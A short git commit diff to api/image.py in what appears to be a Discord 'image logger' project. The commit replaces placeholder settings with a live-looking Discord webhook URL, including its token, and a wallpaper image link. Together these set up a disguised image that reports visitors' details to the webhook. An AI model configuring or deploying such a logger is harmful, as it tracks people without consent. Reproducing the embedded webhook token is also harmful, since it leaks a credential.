9b863d9d2f494afdf9417bcf67f26ea8b634013f
SAXZYS <saxzysdc@gmail.com>
2025-03-16 14:37:21 -0400

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1350893365805318165/Od94FfMuy0tMRYyjh_SggYyt3BNxGx2xcV04iR-4YTShmEshRzGoirnfT5nE-MODIMwJ",
+    "image": "https://wallpaperaccess.com/full/3312022.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
